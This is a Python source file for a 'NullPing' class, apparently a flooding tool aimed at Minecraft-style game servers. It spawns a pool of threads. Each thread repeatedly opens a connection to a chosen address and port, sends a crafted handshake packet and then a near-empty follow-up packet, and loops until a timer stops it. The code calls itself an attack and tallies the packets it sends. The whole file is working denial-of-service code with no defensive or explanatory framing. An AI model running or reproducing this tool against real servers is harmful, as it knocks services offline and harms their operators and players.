import socket
import threading
import time
from multiprocessing.pool import ThreadPool
from .handshake_packet import HandshakePacket


class NullPing:

    def start_test(self):
        try:
            while True:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.connect((self.address, self.port))
                server.send(self.packet)
                server.send(b'\x01\x00')
                server.close()
                self.packets += 1
                if self.pps != -1 and self.pps > 0:
                    time.sleep(1 / self.pps)
        except Exception as e:
            print("Some issue: ", e, ". Reactivating")
            self.start_test()

    def kill_timeout(self):
        print("In total sent over", self.packets, "packets")
        raise SystemExit

    def __init__(self, duration, threads, address, port, pps):
        self.packets = 0
        self.packet = HandshakePacket(47, address, port, 69).get_packet()
        self.address = address
        self.port = port
        self.threads = threads
        self.time = duration
        self.pps = pps
        pool = ThreadPool(processes=threads)
        print("Starting attack by null ping method")
        for threads in range(threads):
            pool.apply_async(self.start_test)
        threading.Timer(duration, self.kill_timeout).start()
